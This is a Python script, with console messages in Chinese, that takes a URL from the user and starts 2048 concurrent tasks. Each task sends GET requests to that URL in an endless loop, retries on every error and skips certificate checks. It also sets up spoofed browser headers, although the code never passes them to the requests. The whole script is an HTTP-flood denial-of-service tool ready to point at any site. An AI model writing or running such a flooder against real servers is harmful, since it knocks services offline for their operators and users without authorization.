import re
import asyncio
import aiohttp

async def main(url, header):
    while True:
        try:
            conn = aiohttp.TCPConnector(verify_ssl=False)
            async with aiohttp.request('GET', url, connector=conn) as res:
                await res.text()
                print("成功")
            conn.close()
        except aiohttp.ClientError as e:
            print(f"网络错误: {e}\n重试中...\n")
        except asyncio.TimeoutError as e:
            print(f"请求超时: {e}\n重试中...\n")
        except Exception as e:
            print(f"错误: {e}\n重试中...\n")

async def start(url, header, task_num=512):
    await asyncio.gather(*[main(url, header) for _ in range(task_num)])

if __name__ == "__main__":
    url = input("输入请求地址(http[s]协议): ")
    if url.startswith("http://") or url.startswith("https://"):
        pass
    else:
        url = f"http://{url}"
    
    host = re.search(r'(?P<protocol>.*?://)?(?P<host>[\w.-]+)(?::(?P<port>\d+))?', url).group("host")
    asyncio.run(start(url, {"Host": host,"Connection": "keep-alive","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Accept-Encoding": "gzip, deflate, br, zstd","Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}, 2048))
